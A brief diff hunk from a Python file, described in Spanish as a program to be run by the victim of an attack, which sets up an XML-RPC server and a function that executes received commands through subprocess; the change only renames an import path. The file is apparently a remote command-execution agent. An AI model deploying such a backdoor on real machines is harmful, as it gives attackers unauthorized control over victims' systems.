@@ -4,7 +4,7 @@ Este programa debe ser ejecutado por la víctima del ataque
 from xmlrpc.server import SimpleXMLRPCServer
 import xmlrpc.client
 import subprocess
-from aux.get_host_ip import get_local_ip
+from utils.get_host_ip import get_local_ip
 
 def lanzar_comando(comando):
     result = subprocess.run(comando,capture_output=True)
